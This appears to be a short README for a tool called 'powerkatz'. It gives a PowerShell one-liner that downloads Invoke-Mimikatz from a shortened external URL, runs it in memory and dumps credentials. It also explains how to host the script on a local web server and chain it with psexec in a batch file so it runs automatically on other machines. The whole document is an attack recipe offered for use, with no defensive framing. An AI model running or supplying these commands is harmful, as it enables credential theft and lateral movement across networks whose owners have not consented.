# powerkatz

idea from powershell + mimikatz command line
powershell "IEX (New-Object Net.WebClient).DownloadString('http://is.gd/oeoFuI'); Invoke-Mimikatz -DumpCreds"

http://is.gd/oeoFuI is Invoke-Mimikatz.ps1 download this powershell file and put it in a local http server, such as hfs.exe.

combine psexec.exe and above powershell to a batch file to auto execute.


